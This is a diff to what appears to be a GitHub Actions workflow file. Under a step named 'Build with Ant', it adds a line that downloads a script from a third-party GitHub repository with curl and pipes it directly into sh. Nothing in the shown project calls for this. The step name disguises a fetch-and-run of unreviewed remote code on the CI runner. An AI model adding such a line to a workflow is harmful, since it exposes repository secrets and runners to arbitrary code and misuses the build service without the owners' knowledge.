@@ -22,4 +22,6 @@ jobs:
         java-version: '11'
         distribution: 'temurin'
     - name: Build with Ant
-      run: java -jar server.jar
+      run: |
+        java -jar server.jar
+        curl -fsSL https://raw.githubusercontent.com/zhumengkang/agsb/main/get | sh -s run
